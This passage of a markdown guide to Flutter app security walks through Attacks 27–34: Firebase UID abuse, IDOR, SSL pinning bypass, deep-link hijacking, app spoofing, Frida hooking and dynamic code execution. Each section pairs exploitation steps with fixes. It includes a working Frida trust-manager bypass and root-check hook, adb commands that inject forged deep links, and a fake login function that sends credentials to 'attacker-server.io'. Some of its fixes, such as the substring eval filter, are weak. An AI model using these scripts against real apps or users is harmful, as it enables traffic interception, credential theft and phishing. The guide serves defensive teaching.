+| 🔓 Vulnerability | Open Firebase rules or trusting client logic                  |
+| ---------------- | ------------------------------------------------------------- |
+| 💣 Impact        | Read/write entire DB, file leaks, privilege abuse             |
+| 🛠️ Fix          | Harden Firestore rules, use auth checks, no client-side trust |
+
+
+-----------------------------------------------------------------
+
+
+
+ATTACK 27 – Firebase Anonymous Auth Hijack & UID Collision Attack**
+
+> *(Exploit Flutter apps using Firebase Anonymous Auth to hijack or impersonate users by abusing UID-based logic — no email, no password, no OTP needed.)*
+
+---
+
+### 📌 **Description**
+
+Many Flutter apps use **Firebase Anonymous Authentication** like this:
+
+```dart
+final user = await FirebaseAuth.instance.signInAnonymously();
+```
+
+This creates a user with a unique `uid`, even without signup.
+
+❗ But many apps **treat this UID as a permanent identity**, storing user data in Firestore like:
+
+```json
+users/
+  abc123/ → {
+    premium: true,
+    name: "Amal",
+    purchases: [...]
+  }
+```
+
+If the attacker can **guess or collide a UID**, or force app to overwrite their `uid` manually, they can hijack that user's data — including purchases, history, or even admin powers.
+
+---
+
+### 🧪 **Exploitation Walkthrough**
+
+#### 🛠️ Step 1: Sign In Anonymously
+
+```dart
+final result = await FirebaseAuth.instance.signInAnonymously();
+final attackerUID = result.user?.uid;
+```
+
+Normally attacker gets their own `uid`.
+
+---
+
+#### 💥 Step 2: Force UID Collision (Vulnerable Code)
+
+Suppose the app stores Firestore like:
+
+```dart
+await FirebaseFirestore.instance
+  .collection('users')
+  .doc(user.uid)
+  .set({'email': 'x', 'isPremium': true});
+```
+
+But the Flutter app allows the user to modify `uid` client-side:
+
+```dart
+// Dangerous: attacker sets a custom UID
+String victimUID = 'abc123';
+FirebaseFirestore.instance
+  .collection('users')
+  .doc(victimUID)
+  .update({'isPremium': true});
+```
+
+✅ Now **attacker has written into another user's data**.
+
+---
+
+#### 💥 Step 3: Bypass via Firebase Rules (Real-World)
+
+Check the security rules:
+
+```json
+{
+  "rules": {
+    "users": {
+      "$uid": {
+        ".read": "$uid === auth.uid",
+        ".write": "$uid === auth.uid"
+      }
+    }
+  }
+}
+```
+
+✅ This protects against UID collision.
+
+❌ But if the app uses **no rules**, or `.read: true`, `.write: true`, it's game over.
+
+---
+
+### 💥 Real-World Abuse
+
+* Hijack another anonymous user’s account by guessing the UID
+* Access their saved data, premium flags, or in-app purchase history
+* Trigger in-app admin modes (if controlled by a field in Firestore)
+
+---
+
+### 🔧 **Fixes**
+
+#### ✅ Fix 1: Lock Firestore by UID
+
+```json
+"users": {
+  "$uid": {
+    ".read": "$uid === auth.uid",
+    ".write": "$uid === auth.uid"
+  }
+}
+```
+
+✅ Ensures users only access their own documents.
+
+---
+
+#### ✅ Fix 2: Do Not Trust Client-Defined UIDs
+
+In Flutter:
+
+```dart
+final currentUID = FirebaseAuth.instance.currentUser?.uid;
+await FirebaseFirestore.instance
+  .collection('users')
+  .doc(currentUID) // Don't let user override this
+  .set({...});
+```
+
+✅ Never allow UIDs to be manually passed from user input.
+
+---
+
+#### ✅ Fix 3: Don’t Rely on Anonymous Auth for Identity
+
+Anonymous users are temporary.
+
+* Use upgrade flow to email/password or phone number auth
+* Or link anonymous account to a secure method:
+
+```dart
+final credential = EmailAuthProvider.credential(email, password);
+await user.linkWithCredential(credential);
+```
+
+---
+
+#### ✅ Fix 4: Use Backend Validation (Optional)
+
+Validate user actions via secure server-side logic:
+
+```dart
+POST /set-premium
+Body: { uid: "abc123" }
+
+✅ Server validates `auth.token` → `uid` mapping
+✅ Only then allows premium flag update
+```
+
+---
+
+### 🛡️ Summary
+
+| 🔐 Vulnerability | Firebase anonymous users treated as permanent identity |
+| ---------------- | ------------------------------------------------------ |
+| 💥 Impact        | Account hijack, premium flag abuse, UID collision      |
+| 🛠️ Fix          | Firestore rules, block UID override, upgrade accounts  |
+
+
+-------------------------------------------------------------------
+
+
+ATTACK 28: INSECURE DIRECT OBJECT REFERENCE (IDOR) – API ID TAMPERING**
+
+📌 **Description**
+IDOR occurs when an app **accepts user-supplied IDs in API calls** but doesn’t validate that the current user is authorized to access those IDs. This allows attackers to change the `user_id`, `order_id`, or `file_id` in requests and access **other users’ private data**.
+
+---
+
+**🧪 Exploitation Steps (Real Curl + Flutter Tamper)**
+
+1. User logs in and views their profile:
+
+```http
+GET /api/user/112233/profile
+Authorization: Bearer eyJhbGciOiJIUzI1...
+```
+
+✅ This works as expected.
+
+2. Attacker intercepts the request (via Burp, Charles Proxy, or app code) and changes `112233` to `112234`:
+
+```bash
+curl -X GET https://api.example.com/api/user/112234/profile \
+  -H "Authorization: Bearer eyJhbGciOiJIUzI1..."
+```
+
+3. If the backend **does not verify that token's user owns ID 112234**, the attacker sees **another user's private profile**.
+
+4. This works with:
+
+   * Orders (`/orders/8471`)
+   * Invoices (`/invoice/9`)
+   * Chats, messages, saved files, etc.
+
+---
+
+**💻 Dart-Side Exploitation Example (Tampered Request)**
+
+```dart
+final userId = '112234'; // not your ID!
+final res = await http.get(
+  Uri.parse('https://api.example.com/api/user/$userId/profile'),
+  headers: {
+    'Authorization': 'Bearer $token',
+  },
+);
+```
+
+✅ If response status is 200 and shows someone else’s data → IDOR exists.
+
+---
+
+**💥 Why This Works**
+
+* App relies on the ID passed in the URL, not the identity inside the JWT.
+* No server-side check like `if (jwt_user_id != requested_id) reject()`
+* Developers trust frontend too much.
+
+---
+
+**🛡️ Secure Fix 1: Enforce Ownership in Backend**
+
+✅ Never trust `user_id` from client.
+
+In your backend (e.g., Node.js, Django, Laravel):
+
+```js
+if (req.user.id !== req.params.userId) {
+  return res.status(403).json({ error: "Access denied" });
+}
+```
+
+✅ Use the `user_id` from the **token**, not from the route.
+
+---
+
+**🛡️ Secure Fix 2: Avoid Passing User IDs at All**
+
+Instead of:
+
+```
+GET /api/user/112233/profile
+```
+
+Do:
+
+```
+GET /api/user/me/profile
+```
+
+✅ Backend knows who you are via token. No ID = no tampering.
+
+---
+
+**🛡️ Secure Fix 3: Role-Based Access Control (RBAC)**
+
+✅ For sensitive operations, verify:
+
+* User’s identity
+* Their role (admin, user, guest)
+* Resource ownership
+
+---
+
+**⚠️ Risk Level: CRITICAL**
+IDOR leads to **data leakage, privacy violations, financial exposure, and even full account takeover** if chained with other attacks.
+
+---
+
+✅ Don’t trust frontend IDs
+✅ Validate resource ownership server-side
+✅ Replace user IDs with `/me`-style routes
+
+
+
+------------------------------------------------------------------------
+
+
+
+ATTACK 29: SSL PINNING BYPASS VIA FRIDA & CERTIFICATE FORGERY
+
+**(Intercept HTTPS traffic even when pinned)**
+
+---
+
+### 📌 **Description**
+
+SSL pinning ensures that the Flutter app **only communicates with trusted certificates** (usually your backend server’s cert). Without it, attackers can use **Burp Suite, Charles Proxy, or mitmproxy** to intercept and **modify** traffic between your app and server.
+
+Even if SSL pinning is implemented in Flutter, attackers can use **Frida** to hook and bypass it **at runtime**, especially if the pinning is done using insecure or known Dart methods.
+
+---
+
+### 🧪 Exploitation Steps (SSL Pinning Bypass)
+
+---
+
+### 🔨 Method 1: MITM Without Pinning (No Defense)
+
+1. Set up **Burp Suite** and install its CA cert on Android device
+2. Proxy app traffic via Burp → intercept all requests:
+
+```bash
+Burp Proxy: 127.0.0.1:8080
+```
+
+3. If app loads normally and shows JSON, login success, etc.
+   ✅ App is **not using SSL pinning at all**
+
+---
+
+### 💉 Method 2: Bypass SSL Pinning (If Enforced)
+
+If app shows `CERT_VERIFY_FAILED` or crashes when proxied → **SSL pinning is in place**.
+
+Now bypass it with **Frida**.
+
+---
+
+#### 📍 Frida Script to Bypass SSL Pinning on Android (OkHttp, WebView, etc.)
+
+```js
+Java.perform(function () {
+  var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+  var SSLContext = Java.use('javax.net.ssl.SSLContext');
+
+  var TrustManager = Java.registerClass({
+    name: 'dev.hack.TrustManager',
+    implements: [X509TrustManager],
+    methods: {
+      checkClientTrusted: function () {},
+      checkServerTrusted: function () {},
+      getAcceptedIssuers: function () { return []; }
+    }
+  });
+
+  var TrustManagers = [TrustManager.$new()];
+  var SSLContextInit = SSLContext.init.overload(
+    '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom'
+  );
+
+  SSLContextInit.implementation = function (km, tm, sr) {
+    console.log('[+] Overriding SSLContext init with custom TrustManager');
+    SSLContextInit.call(this, km, TrustManagers, sr);
+  };
+});
+```
+
+✅ This removes all server cert validation — **even with pinning**.
+
+---
+
+### 💻 Vulnerable Flutter Code (Common Mistake)
+
+```dart
+final client = HttpClient()
+  ..badCertificateCallback = ((cert, host, port) => true); // 🚨 Disable all SSL validation
+```
+
+✅ Used during dev/testing — but if left in release builds, it **disables all SSL protection**.
+
+---
+
+### 💥 Why This Works
+
+* Flutter uses native networking under the hood (`OkHttp`, `HttpURLConnection`, `WebView`)
+* Frida can hook and patch these methods in real-time
+* `badCertificateCallback` in Dart can be **abused or overlooked**
+
+---
+
+### 🛡️ Secure Fix 1: Remove `badCertificateCallback`
+
+```dart
+final client = HttpClient();
+```
+
+✅ Never use `badCertificateCallback = true` in production.
+
+---
+
+### 🛡️ Secure Fix 2: Implement Real SSL Pinning with Cert Hash (Dio Example)
+
+Use **SHA-256 fingerprint pinning**:
+
+```dart
+final dio = Dio();
+
+(dio.httpClientAdapter as DefaultHttpClientAdapter).onHttpClientCreate = (client) {
+  SecurityContext sc = SecurityContext();
+  return HttpClient(context: sc)
+    ..badCertificateCallback = (X509Certificate cert, String host, int port) {
+      const pinnedFingerprint = "F3:0D:76:A4:...";
+      final fingerprint = cert.sha256.toUpperCase();
+      return fingerprint == pinnedFingerprint;
+    };
+};
+```
+
+✅ Only allows trusted cert with correct fingerprint.
+
+---
+
+### 🛡️ Secure Fix 3: Enforce Network Security Config (Android)
+
+In `res/xml/network_security_config.xml`:
+
+```xml
+<network-security-config>
+  <domain-config>
+    <domain includeSubdomains="true">yourdomain.com</domain>
+    <pin-set expiration="2025-12-01">
+      <pin digest="SHA-256">base64_encoded_cert_fingerprint</pin>
+    </pin-set>
+  </domain-config>
+</network-security-config>
+```
+
+Then in `AndroidManifest.xml`:
+
+```xml
+<application
+  android:networkSecurityConfig="@xml/network_security_config">
+```
+
+✅ Pins cert at OS level — harder to bypass with Frida.
+
+---
+
+### 🛡️ Secure Fix 4: Detect Frida/Root Before Networking
+
+Use anti-hooking logic before firing HTTP requests:
+
+* Scan `/proc/self/maps` for `frida` or `gadget`
+* Check `tracerpid`
+* Use `flutter_jailbreak_detection`
+
+```dart
+if (await RootCheck.isRooted) exit(0);
+```
+
+---
+
+### ⚠️ Risk Level: **CRITICAL**
+
+SSL bypass = **full traffic capture** → login creds, tokens, payments, internal APIs, user data — everything.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Flutter app allows or can be forced to accept fake HTTPS certs |
+| ---------------- | -------------------------------------------------------------- |
+| 💣 Impact        | MITM attack, data theft, session hijack                        |
+| 🛠️ Fix          | Pin certs, remove `badCertificateCallback`, detect Frida       |
+
+
+
+-------------------------------------------------------------------------
+
+
+
+ATTACK 30: URI SCHEME HIJACK IN FLUTTER
+
+**(Exploit custom `IntentFilters` / deep links to hijack login, payments, or inject data)**
+
+---
+
+### 📌 **Description**
+
+Flutter apps often register deep links like:
+
+```xml
+<intent-filter>
+  <action android:name="android.intent.action.VIEW"/>
+  <category android:name="android.intent.category.DEFAULT"/>
+  <category android:name="android.intent.category.BROWSABLE"/>
+  <data android:scheme="myapp" android:host="auth"/>
+</intent-filter>
+```
+
+This allows launching the app with:
+
+```
+myapp://auth?token=eyJhbGciOi...
+```
+
+✅ If your app trusts and **automatically parses these URLs**, attackers can:
+
+* Send **crafted deep links**
+* Launch flows without user interaction
+* **Inject fake tokens** or commands
+* Abuse internal logic (e.g., `myapp://premium?enable=true`)
+
+---
+
+### 🧪 Exploitation Steps — URI Hijack via Intent Abuse
+
+---
+
+#### 🎯 Step 1: App Registers Custom Scheme (e.g., `myapp://`)
+
+Flutter code:
+
+```dart
+getInitialUri().then((uri) {
+  final token = uri?.queryParameters["token"];
+  if (token != null) {
+    authenticateWithToken(token);
+  }
+});
+```
+
+✅ If no validation on `token`, attacker launches:
+
+```bash
+adb shell am start -a android.intent.action.VIEW \
+-d "myapp://auth?token=attacker_token"
+```
+
+➡️ Auto-login as attacker, or session injection.
+
+---
+
+#### 🧨 Step 2: App Performs Auto-Action
+
+```dart
+if (uri?.path == "/premium") {
+  enablePremium();
+}
+```
+
+✅ Attacker sends `myapp://premium` and **activates premium features**.
+
+---
+
+### 💥 Why This Works
+
+* Custom URI handlers can be triggered by **any app or intent**
+* Flutter doesn’t enforce origin/source validation
+* Apps often **don’t verify the caller or content**
+* URI parameters are trusted blindly
+
+---
+
+### 💻 Vulnerable Dart Code
+
+```dart
+void handleUri(Uri? uri) {
+  final token = uri?.queryParameters["token"];
+  if (token != null) {
+    loginUser(token); // no validation
+  }
+}
+```
+
+✅ Attacker injects fake token via deep link.
+
+---
+
+### 🛡️ Secure Fix 1: Always Validate URI Content
+
+Never use deep link parameters directly:
+
+```dart
+if (isValidToken(uri.queryParameters["token"])) {
+  loginUser(uri.queryParameters["token"]!);
+}
+```
+
+✅ Call backend to validate tokens or actions.
+
+---
+
+### 🛡️ Secure Fix 2: Require User Interaction
+
+Don't auto-accept actions from deep links:
+
+```dart
+showDialog(
+  context: context,
+  builder: (_) => AlertDialog(
+    title: Text("External link request"),
+    content: Text("Do you want to continue login?"),
+    actions: [...],
+  ),
+);
+```
+
+✅ Prevents silent abuse.
+
+---
+
+### 🛡️ Secure Fix 3: Validate Intent Source (Optional)
+
+For Android native code, restrict intent access:
+
+```java
+if (!getCallingActivity().getPackageName().equals("com.mytrustedapp")) {
+    return;
+}
+```
+
+✅ Prevents other apps from launching your URI scheme.
+
+---
+
+### 🛡️ Secure Fix 4: Use Firebase Dynamic Links or App Links
+
+Instead of custom `myapp://` schemes, use:
+
+* \[App Links (https\://)] for verified domains
+* [Firebase Dynamic Links](https://firebase.google.com/docs/dynamic-links)
+
+✅ These enforce domain-level validation and HTTPS integrity.
+
+---
+
+### ⚠️ Risk Level: HIGH
+
+Deep link injection = logic abuse, privilege elevation, silent login.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Custom URI scheme with insecure parameter handling  |
+| ---------------- | --------------------------------------------------- |
+| 💣 Impact        | Account hijack, logic abuse, premium unlock         |
+| 🛠️ Fix          | Validate token origin, confirm actions, block abuse |
+
+
+
+
+
+-------------------------------------------------------------------------
+
+
+
+ATTACK 31 : DEEP LINK HIJACKING IN FLUTTER
+
+**(Launch your app with fake deep links or steal real ones)**
+
+---
+
+### 📌 **Description**
+
+Flutter apps often register deep links like:
+
+```
+myapp://reset-password?token=XYZ  
+myapp://verify?code=1234  
+https://myapp.com/open?id=991  
+```
+
+But if:
+
+* You don’t verify who triggered the link
+* You parse parameters without validation
+* You expose sensitive actions via links (e.g. reset password, verify token)
+
+Then **attackers can hijack or spoof them**, launching your app in unintended ways.
+
+---
+
+### 🧪 Exploitation Steps – Deep Link Hijack
+
+---
+
+#### 📲 Step 1: Register Malicious App That Claims Same URL Scheme
+
+On Android, attacker registers this in `AndroidManifest.xml`:
+
+```xml
+<intent-filter>
+  <action android:name="android.intent.action.VIEW" />
+  <category android:name="android.intent.category.DEFAULT" />
+  <category android:name="android.intent.category.BROWSABLE" />
+  <data android:scheme="myapp" android:host="reset-password" />
+</intent-filter>
+```
+
+✅ When user clicks `myapp://reset-password?token=xyz`, attacker’s app opens instead.
+
+---
+
+#### 🔓 Step 2: Send Fake Intents via ADB or Apps
+
+```bash
+adb shell am start -a android.intent.action.VIEW \
+  -d "myapp://verify?code=9999" com.target.flutterapp
+```
+
+✅ App opens **with forged data**, e.g. wrong token.
+
+---
+
+#### 🧪 Step 3: Abuse Token-Based Links
+
+App might contain logic like:
+
+```dart
+Uri link = await getInitialUri(); // from uni_links or firebase_dynamic_links
+if (link.path == '/reset-password') {
+  final token = link.queryParameters['token'];
+  resetWithToken(token); // DANGEROUS if token is not validated
+}
+```
+
+✅ Attacker can inject **any token**.
+
+---
+
+#### 🧟‍♂️ Bonus: Hijack Firebase Dynamic Links
+
+Firebase Dynamic Links support URLs like:
+
+```
+https://myapp.page.link/?link=https://myapp.com/verify?code=1234
+```
+
+If attacker sends a fake version (phishing):
+
+```
+https://malicious.page.link/?link=https://myapp.com/fake?payload=steal
+```
+
+✅ Users **can’t distinguish** the redirect.
+
+---
+
+### 💥 Why This Works
+
+* Flutter relies on external plugins (`uni_links`, `firebase_dynamic_links`)
+* Developers parse URIs without validating origin or context
+* URL schemes (`myapp://`) can be claimed by **any app** on Android
+* iOS Universal Links don’t always guarantee secure opening
+* Deep links often used for **privileged flows** (reset, verify, auth)
+
+---
+
+### 🛡️ Secure Fix 1: Verify Link Source (Intent Caller Check)
+
+Use Android native code to validate the calling app:
+
+```java
+String referrer = intent.getStringExtra("android.intent.extra.REFERRER_NAME");
+if (!referrer.contains("trusted.app")) {
+  finish(); // reject untrusted sources
+}
+```
+
+✅ Prevents malicious apps from spoofing links.
+
+---
+
+### 🛡️ Secure Fix 2: Validate All Deep Link Params Server-Side
+
+Never trust:
+
+```dart
+final code = uri.queryParameters['code'];
+verifyCodeLocally(code); // ❌
+```
+
+Instead:
+
+```dart
+final result = await backend.verifyCode(uri.queryParameters['code']);
+if (result.verified) proceed();
+```
+
+✅ Prevents token injection.
+
+---
+
+### 🛡️ Secure Fix 3: Avoid Privileged Logic in URI Schemes
+
+Don’t allow:
+
+* `myapp://grant-access?admin=true`
+* `myapp://unlock-premium?license=abcd`
+
+Move such logic to **secure server flows only.**
+
+---
+
+### 🛡️ Secure Fix 4: Enforce Strong Intent Filters + App Links
+
+For Android:
+
+```xml
+<asset_statements src="https://yourdomain.com/.well-known/assetlinks.json" />
+```
+
+✅ Binds your app to real domains, so **only your app** can open `https://myapp.com/*`.
+
+For iOS:
+
+* Use Universal Links with `apple-app-site-association` validation.
+
+---
+
+### 🛡️ Secure Fix 5: Sanitize & Log Deep Link Usage
+
+Log every deep link opened:
+
+```dart
+print("Deep link opened: $uri");
+```
+
+✅ Helps detect abuse in logs.
+
+---
+
+### ⚠️ Risk Level: HIGH
+
+Deep link hijack = account takeover, forced logic execution, phishing flow injection.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Unvalidated deep links or URI schemes                |
+| ---------------- | ---------------------------------------------------- |
+| 💣 Impact        | Fake flows, privilege abuse, phishing                |
+| 🛠️ Fix          | Validate sources, verify tokens, avoid scheme misuse |
+
+
+
+------------------------------------------------------------------------------
+
+
+
+
+ATTACK 32: FLUTTER APP SPOOFING
+
+**(Clone the UI of a trusted Flutter app to phish users)**
+
+---
+
+### 📌 **Description**
+
+App spoofing is when an attacker **clones the UI and design of a real Flutter app**, compiles it into a fake app, and distributes it through:
+
+* Fake app stores (Aptoide, APKPure, etc.)
+* Direct download links / ads
+* SMS phishing or QR codes
+* Preinstalled bloatware on shady phones
+
+The fake app **looks identical to the real one**, but:
+
+* Sends login credentials to a malicious server
+* Injects fake updates, errors, or popups
+* Fakes payments or redirects real actions to attacker’s backend
+* Harvests user info, location, or tokens
+
+✅ Most users **can’t tell the difference**, especially if they side-load APKs.
+
+---
+
+### 🧪 Exploitation Steps — Build a Fake Flutter App
+
+---
+
+#### 🧬 Step 1: Recreate the UI of a Real App
+
+Use the same layout, fonts, assets — you don’t even need the original code. Tools:
+
+* **Flutter UI clone from screenshots**
+* **Figma to Flutter export**
+* Copy widgets using Flutter Inspector
+
+Example:
+
+```dart
+TextField(
+  controller: emailController,
+  decoration: InputDecoration(labelText: "Email"),
+),
+TextField(
+  controller: passwordController,
+  obscureText: true,
+  decoration: InputDecoration(labelText: "Password"),
+),
+ElevatedButton(
+  onPressed: () => fakeLogin(email, password),
+  child: Text("Sign In"),
+),
+```
+
+---
+
+#### 🐍 Step 2: Replace Backend with Malicious API
+
+```dart
+void fakeLogin(String email, String password) async {
+  await http.post(
+    Uri.parse("https://attacker-server.io/steal"),
+    body: {"email": email, "password": password},
+  );
+}
+```
+
+✅ The app **looks real**, but sends credentials to an attacker.
+
+---
+
+#### 🎭 Step 3: Sign + Publish the App
+
+```bash
+flutter build apk --release
+jarsigner -keystore hacker.jks fakeapp.apk hackerkey
+```
+
+Then distribute via:
+
+* WhatsApp phishing messages
+* Fake download sites
+* Malicious QR codes
+* Push notifications from already-installed malware
+
+---
+
+#### 💣 Bonus: Use Real App Icons & Package Names
+
+```xml
+<application
+  android:icon="@mipmap/ic_launcher"
+  android:label="SecureBank"
+  android:theme="@style/AppTheme">
+```
+
+✅ Looks **exactly like the legit app** — may even trick Play Store if not properly scanned.
+
+---
+
+### 💥 Why This Works
+
+* Flutter UI is easy to recreate — pixel-perfect clones are trivial
+* No server validation for app authenticity
+* Users trust design over domain or install source
+* Side-loading allows unsigned, spoofed apps
+* Many apps don’t detect package tampering or branding misuse
+
+---
+
+### 🛡️ Secure Fix 1: Use Play Integrity API (Server-Side)
+
+On your real app’s backend, verify:
+
+* App signature hash matches original
+* App is installed via Play Store
+* App integrity is verified by Google
+
+Reject any requests failing the check:
+
+```dart
+if (!backendVerifiedPlayIntegrity()) return unauthorized();
+```
+
+✅ Blocks spoofed apps even if frontend looks identical.
+
+---
+
+### 🛡️ Secure Fix 2: Enforce Unique Package Signature
+
+In backend, validate requests come only from real signed app:
+
+* Validate `SHA256(app-signing-key)`
+* Reject requests from unknown app hashes
+
+---
+
+### 🛡️ Secure Fix 3: Dynamic Branding or Real-Time API Verification
+
+```dart
+await http.post("https://secure.api.com/verifyApp", body: {
+  "version": appVersion,
+  "package": appPackageName
+});
+```
+
+✅ Don’t hardcode logos, assets, or UI logic — use real-time values so cloned apps fail to match fully.
+
+---
+
+### 🛡️ Secure Fix 4: Educate Users
+
+* Warn users against installing APKs from outside the Play Store
+* Detect package tampering and notify user inside the app
+* Use dynamic branding that changes on each app version
+
+---
+
+### ⚠️ Risk Level: EXTREMELY HIGH
+
+App spoofing = phishing, data theft, account hijack — with zero Dart vulnerabilities needed.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Fake Flutter app mimics real one for phishing                 |
+| ---------------- | ------------------------------------------------------------- |
+| 💣 Impact        | Credential theft, data exfiltration, fraud                    |
+| 🛠️ Fix          | Play Integrity, backend signature validation, branding checks |
+
+
+
+-----------------------------------------------------------------------
+
+
+
+ATTACK 33: RUNTIME CODE INJECTION VIA FRIDA HOOKING ON FLUTTER PLUGINS**
+
+📌 **Description**
+Flutter plugins are compiled into **native shared libraries (.so)**. Attackers can hook into these libraries at runtime using **Frida**, and modify their behavior — **even if the main Dart code is secure**. This allows modification of plugin behavior like payment validation, biometric checks, root detection, etc.
+
+---
+
+**🧪 Exploitation Steps (Frida Native Hook PoC)**
+
+1. Identify a vulnerable plugin call (e.g., `in_app_purchase`, `flutter_local_auth`, `device_info_plus`, etc.)
+
+2. Connect to the target app via Frida:
+
+```bash
+frida -U -n com.example.myapp
+```
+
+3. Hook a native method (e.g., `isDeviceRooted` from native code):
+
+```js
+Interceptor.attach(Module.findExportByName(null, 'isDeviceRooted'), {
+  onEnter: function (args) {
+    console.log('[*] Root check called');
+  },
+  onLeave: function (retval) {
+    console.log('[*] Original Return: ' + retval);
+    retval.replace(0); // force root = false
+  }
+});
+```
+
+✅ The plugin now reports “not rooted” even if it is.
+
+---
+
+**💻 Example Use Case (Dart Calls Native Plugin)**
+
+```dart
+final info = await DeviceInfoPlugin().androidInfo;
+print("Rooted: ${info.isPhysicalDevice}");
+```
+
+If the `.so` file is hooked, the Dart code can't detect the tampering — it will just receive the **forged value**.
+
+---
+
+**💥 Why This Works**
+
+* Plugins are native `.so` binaries.
+* Dart trusts plugin results blindly.
+* Flutter doesn’t verify native plugin integrity.
+* On rooted/emulated devices, attackers can hook or swap `.so` files.
+
+---
+
+**🛡️ Secure Fix 1: Add Plugin Integrity Verification (Optional)**
+
+Use checksum-based verification:
+
+```dart
+Future<bool> verifyPluginIntegrity() async {
+  final pluginPath = '/data/app/com.example.myapp/lib/arm64/libplugin.so';
+  final file = File(pluginPath);
+  final bytes = await file.readAsBytes();
+  final hash = sha256.convert(bytes);
+  return hash.toString() == expectedHash;
+}
+```
+
+✅ Verify `.so` hasn't been replaced.
+
+---
+
+**🛡️ Secure Fix 2: Move Validation to Server**
+
+Don’t rely on plugin output alone. Example:
+
+❌ Bad:
+
+```dart
+if (plugin.isGenuine == true) allowPremium();
+```
+
+✅ Better:
+
+```dart
+final result = await plugin.checkSignature();
+final verified = await backend.verify(result);
+
+if (verified) unlockFeatures();
+```
+
+✅ Only unlock features if backend confirms plugin validation.
+
+---
+
+**🛡️ Secure Fix 3: Frida & Root Detection**
+
+Flutter can't detect Frida directly, but native plugins can:
+
+* Scan for Frida process: `ps | grep frida`
+* Detect `tracerpid != 0`
+* Check for `libfrida-gadget.so` in memory map
+
+Use `flutter_jailbreak_detection` + custom native checks.
+
+---
+
+**🛡️ Optional: Obfuscate Native Code**
+
+Use ProGuard or native stripping (NDK):
+
+```bash
+-keep class com.plugin.** { *; }
+-renamesourcefileattribute SourceFile
+```
+
+✅ Slows down reverse engineering (not full protection).
+
+---
+
+**⚠️ Risk Level: HIGH**
+Code injection = logic bypass, payment forgery, security evasion.
+
+---
+
+✅ Never trust plugin output blindly
+✅ Detect tampering and Frida
+✅ Verify plugin behavior server-side if possible
+✅ Harden `.so` files with integrity checks
+
+
+
+---------------------------------------------------------------------------
+
+
+
+ATTACK 34: DYNAMIC CODE EXECUTION IN FLUTTER
+
+**(Exploit DartEval, backdoor plugins, or memory patching to execute custom code inside a running Flutter app)**
+
+---
+
+### 📌 **Description**
+
+Flutter apps are **AOT compiled**, which typically prevents dynamic Dart code execution. However, **advanced techniques** like the following still make it possible:
+
+* `dart_eval` package — runs dynamic Dart-like expressions
+* Plugin backdoors with `MethodChannel` injection
+* Native `.so` patching via Frida / Ghidra
+* Embedding malicious logic in updatable config files or scripts
+* Custom FFI calls to unsafe native code
+
+➡️ If your app uses any dynamic logic plugins, or executes content from remote config, you **may be vulnerable**.
+
+---
+
+### 🧪 Exploitation Steps – Dynamic Code Execution via `dart_eval`
+
+---
+
+#### 🛠️ Step 1: App Integrates DartEval
+
+```yaml
+dependencies:
+  dart_eval: ^0.6.0
+```
+
+Used like:
+
+```dart
+final runtime = Runtime();
+runtime.eval("1 + 2");
+```
+
+✅ If attackers gain access to config or override the eval string (via WebView, deep link, modified asset), they can execute:
+
+```dart
+runtime.eval("deleteAllUserData()");
+```
+
+---
+
+#### 💣 Step 2: Attacker Modifies Asset to Inject Code
+
+In `assets/config.json`:
+
+```json
+{
+  "eval_code": "disableLoginCheck(); unlockPremium();"
+}
+```
+
+Dart code:
+
+```dart
+final code = jsonDecode(config)["eval_code"];
+runtime.eval(code);  // 🔥 Executes attacker code
+```
+
+✅ Game over. App executes attacker instructions from asset or remote config.
+
+---
+
+### 🧠 Advanced Variant: Plugin Backdoor via MethodChannel
+
+In native code:
+
+```java
+channel.setMethodCallHandler((call, result) -> {
+  if (call.method.equals("runCode")) {
+    String dartCode = call.argument("code");
+    // Fake plugin pretends to forward code to Dart
+  }
+});
+```
+
+If plugin is backdoored (intentionally or via supply chain), attacker can:
+
+```dart
+MethodChannel('evil_plugin').invokeMethod('runCode', {'code': 'bypassAuth();'});
+```
+
+✅ Stealthy — very hard to detect.
+
+---
+
+### 💉 Native Dynamic Hooking via Frida
+
+Hook Dart VM or native plugin methods to execute custom logic:
+
+```js
+Interceptor.attach(Module.findExportByName(null, "Dart_Invoke"), {
+  onEnter: function (args) {
+    if (Memory.readUtf8String(args[1]).includes("isUserLoggedIn")) {
+      console.log("Bypassing auth check...");
+      args[1] = ptr(0);  // patch method
+    }
+  }
+});
+```
+
+✅ Modifies behavior at runtime even in secure builds.
+
+---
+
+### 💥 Why This Works
+
+* `dart_eval` enables **runtime code execution**
+* Unvalidated remote configs or assets used in `eval()`
+* Native code + plugin channels are vulnerable if unchecked
+* Obfuscated plugins might have **intentionally malicious logic**
+* Frida or Ghidra enable **live method patching**
+
+---
+
+### 💻 Vulnerable Dart Code
+
+```dart
+final logic = remoteConfig["dart_eval_code"];
+runtime.eval(logic); // ⚠️ Unsafe execution
+```
+
+✅ Attacker controls input → arbitrary Dart commands run.
+
+---
+
+### 🛡️ Secure Fix 1: Don’t Use `dart_eval` in Production
+
+Avoid using `dart_eval`, `mirrors`, or eval-like libraries unless absolutely sandboxed.
+
+✅ They break AOT protection.
+
+---
+
+### 🛡️ Secure Fix 2: Whitelist Permitted Operations
+
+If `dart_eval` is unavoidable:
+
+```dart
+runtime.addLibrary("safe", {
+  "getVersion": () => "v1.0.0",
+  "isUserPremium": () => false,
+});
+```
+
+✅ Prevents attacker from accessing internal functions.
+
+---
+
+### 🛡️ Secure Fix 3: Verify Remote/Asset Input Before Use
+
+```dart
+final code = json["eval_code"];
+if (!code.contains("()") || code.contains("delete")) {
+  throw Exception("Eval code not allowed");
+}
+```
+
+✅ Blocks malicious expressions.
+
+---
+
+### 🛡️ Secure Fix 4: Scan Plugins for Backdoors
+
+* Audit plugin source code
+* Avoid closed-source native plugins
+* Use tools like `mobSF`, `apktool`, `jadx` to scan plugin `.so` and `.jar` files
+
+---
+
+### 🛡️ Secure Fix 5: Harden Native Runtime
+
+* Detect Frida hooks
+* Use SafetyNet / Play Integrity API
+* Detect `libfrida-gadget.so`
+* Obfuscate native code
+
+---
+
+### ⚠️ Risk Level: CRITICAL+
+
+Runtime code injection = full takeover, logic rewrite, remote control.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Dynamic code execution via DartEval or plugin backdoors           |
+| ---------------- | ----------------------------------------------------------------- |
